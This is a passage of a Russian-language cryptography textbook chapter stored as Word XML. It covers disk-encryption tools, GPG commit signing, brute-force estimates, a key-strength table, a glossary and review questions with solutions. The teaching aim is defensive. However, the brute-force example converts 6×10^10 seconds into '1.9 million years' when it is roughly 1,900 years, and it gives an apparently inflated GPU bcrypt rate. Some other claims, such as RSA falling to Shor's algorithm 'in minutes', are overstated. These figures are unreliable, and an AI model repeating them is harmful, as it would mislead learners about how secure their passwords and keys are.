      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструменты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows**: BitLocker (встроен в Pro/Enterprise версии)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS**: FileVault (встроен)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux**: LUKS (dm-crypt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Подписание коммита в Git</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Чтобы доказать, что коммит сделал именно ты (а не хакер, который украл твой логин/пароль GitHub).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как настроить</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Генерация GPG-ключа</w:t>
        <w:br/>
        <w:t>gpg --full-generate-key</w:t>
        <w:br/>
        <w:br/>
        <w:t># Настройка Git</w:t>
        <w:br/>
        <w:t>git config --global user.signingkey &lt;твой GPG ID&gt;</w:t>
        <w:br/>
        <w:t>git config --global commit.gpgsign true</w:t>
        <w:br/>
        <w:br/>
        <w:t># Коммит с подписью</w:t>
        <w:br/>
        <w:t>git commit -S -m "Added crypto chapter"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Проверка подписи</w:t>
        <w:br/>
        <w:t>git log --show-signature</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t>: На GitHub появится зелёная галочка "Verified" рядом с коммитом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Расчёт времени для перебора пароля</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Длина пароля: 8 символов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Символы: a-z, A-Z, 0-9, спецсимволы (всего ~94 символа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хэш: bcrypt (cost factor = 12)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество вариантов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>94^8 ≈ 6 × 10^15 (6 квадриллионов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Скорость перебора</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>bcrypt (cost = 12): ~10 хэшей/сек на одном CPU</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>На GPU (NVIDIA RTX 4090): ~100,000 хэшей/сек (bcrypt плохо параллелится)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время взлома</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>6 × 10^15 / 100,000 = 6 × 10^10 секунд</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    ≈ 1.9 миллиона лет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 8-символьный пароль с bcrypt — относительно безопасен. Но лучше </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>12+ символов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (особенно если используешь SHA-256 вместо bcrypt).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Размер ключей и эквивалентность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Алгоритм           | Размер ключа (бит) | Эквивалентная стойкость (бит) | Примечание                  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------------------|--------------------|-------------------------------|-----------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| AES                | 128                | 128                           | Симметричное, быстрое       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| AES                | 256                | 256                           | "Military-grade" (маркетинг)|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| RSA                | 2048               | ~112                          | Асимметричное, медленное    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| RSA                | 3072               | ~128                          | Эквивалентно AES-128        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| RSA                | 4096               | ~140                          | Параноидальный уровень      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ECC (secp256k1)    | 256                | ~128                          | Bitcoin                     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ECC (ed25519)      | 256                | ~128                          | SSH, Signal                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| SHA-256            | N/A                | 256                           | Хэш-функция                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| bcrypt (cost=12)   | N/A                | ~78                           | Медленный (10 хэшей/сек)    |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: ECC-256 эквивалентен RSA-3072, но в 12 раз короче. Вот почему ECC популярен в мобильных устройствах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Криптография</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — наука о методах шифрования и защиты информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шифр Цезаря</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сдвиг символов на фиксированное число позиций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шифр Виженера</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — полиалфавитная замена с использованием кодового слова.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Энигма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — электромеханическая машина для шифрования (Германия, Вторая мировая).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Симметричное шифрование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — один ключ для шифрования и расшифрования (AES, DES, 3DES).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AES (Advanced Encryption Standard)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандарт симметричного шифрования (2001), размер ключа 128/192/256 бит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Режимы работы AES</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ECB** (Electronic Codebook) — небезопасный (одинаковые блоки → одинаковый шифротекст).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CBC** (Cipher Block Chaining) — каждый блок XOR'ится с предыдущим.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CTR** (Counter Mode) — шифрование счётчика, параллелизуемый.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GCM** (Galois/Counter Mode) — CTR + аутентификация (integrity), лучший выбор для TLS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Асимметричное шифрование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — два ключа: публичный (для шифрования) и приватный (для расшифрования).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RSA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм асимметричного шифрования (1977), основан на факторизации больших чисел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Diffie-Hellman</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол обмена ключами (1976), позволяет двум сторонам согласовать общий секретный ключ по незащищённому каналу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ECC (Elliptic Curve Cryptography)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — асимметричное шифрование на эллиптических кривых, короткие ключи (256 бит = RSA-3072).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Гибридное шифрование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — комбинация симметричного (AES) и асимметричного (RSA): шифруем файл на AES, ключ AES шифруем на RSA.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хэш-функция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — односторонняя функция, выдаёт фиксированную длину (SHA-256 → 256 бит).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MD5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — устаревшая хэш-функция (128 бит), легко найти коллизию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SHA-1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — устаревшая хэш-функция (160 бит), коллизия найдена в 2017 году.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SHA-256</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стойкая хэш-функция (256 бит), используется в Bitcoin, TLS, Git.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SHA-3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — новый стандарт хэш-функции (2015), другая внутренняя структура (sponge construction).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bcrypt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — медленная хэш-функция для хранения паролей (адаптивный cost factor).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Argon2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — победитель Password Hashing Competition 2015, защита от GPU атак (требует много памяти).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Соль (Salt)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — случайное значение, добавляемое к паролю перед хэшированием, чтобы защитить от rainbow tables.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rainbow table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — предвычисленная таблица хэшей для популярных паролей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цифровая подпись</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — хэш документа, зашифрованный приватным ключом, доказывает авторство и целостность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PKI (Public Key Infrastructure)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система сертификатов и центров сертификации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CA (Certificate Authority)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — центр сертификации (Let's Encrypt, DigiCert), подписывает публичные ключи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TLS/SSL (Transport Layer Security)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол для защиты данных в интернете (HTTPS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSH (Secure Shell)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол для удалённого управления серверами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VPN (Virtual Private Network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — туннель, шифрующий весь трафик.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OpenVPN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — популярный протокол VPN (медленный, надёжный).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WireGuard</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — современный протокол VPN (быстрый, простой, безопасный).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PGP/GPG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — шифрование email'ов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>E2E (End-to-End) шифрование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — шифрование от отправителя до получателя (даже сервер не может расшифровать).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Квантовая криптография</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — использование квантовых эффектов для защиты данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм Шора</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — квантовый алгоритм для факторизации больших чисел (взломает RSA за минуты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Post-Quantum Cryptography</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритмы, устойчивые к атакам квантовых компьютеров (CRYSTALS-Kyber, CRYSTALS-Dilithium).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Теория</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём разница между симметричным и асимметричным шифрованием?** Приведи примеры алгоритмов для каждого типа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему режим ECB (Electronic Codebook) небезопасен?** Что используется вместо ECB?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое гибридное шифрование?** Объясни, как оно используется в HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличается хэш-функция от шифрования?** Можно ли восстановить исходный текст из SHA-256 хэша?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему нельзя хранить пароли в виде MD5 или SHA-256?** Какие алгоритмы нужно использовать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое соль (salt) и зачем она нужна?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Как работает цифровая подпись?** Какой ключ используется для подписания, а какой для проверки?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое PKI (Public Key Infrastructure)?** Объясни роль центров сертификации (CA).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему квантовые компьютеры угрожают RSA?** Какие алгоритмы будут использоваться после появления квантовых компьютеров?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Практика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Алиса хочет отправить зашифрованный файл (100 Мб) Бобу. У неё есть публичный ключ RSA-2048 Боба. Почему нельзя просто зашифровать файл на RSA? Предложи способ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">RSA </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>медленный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (шифрование 100 Мб займёт часы). Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Генерируем случайный AES-256 ключ (32 байта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Шифруем файл на AES-256-GCM (быстро, ~1 секунда)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Шифруем ключ AES на RSA (32 байта, быстро)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляем зашифрованный файл + зашифрованный ключ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Боб:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Расшифровывает ключ AES своим приватным ключом RSA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Расшифровывает файл на AES</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Хакер украл базу данных с паролями. Пароли хранятся в виде `SHA-256(password)` (без соли). Длина паролей — 6 символов (только цифры). Сколько времени понадобится хакеру, чтобы взломать все пароли? (Скорость: 10 миллиардов SHA-256/сек на GPU)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество вариантов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>10^6 = 1,000,000 (один миллион)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время взлома</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1,000,000 / 10,000,000,000 = 0.0001 секунды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: SHA-256 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>без соли</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — катастрофа. Хакер взломает все пароли </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>мгновенно</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать **bcrypt** или **Argon2** (медленные, с солью)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минимум **12 символов** (цифры + буквы + спецсимволы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Сравни стойкость ключей:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Алгоритм | Размер ключа | Эквивалентная стойкость (бит) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|--------------|------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| AES-128  | 128          | ?                            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| RSA-2048 | 2048         | ?                            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ECC-256  | 256          | ?                            |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Какой из них </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>самый длинный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>самый слабый</w:t>
      </w:r>
      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
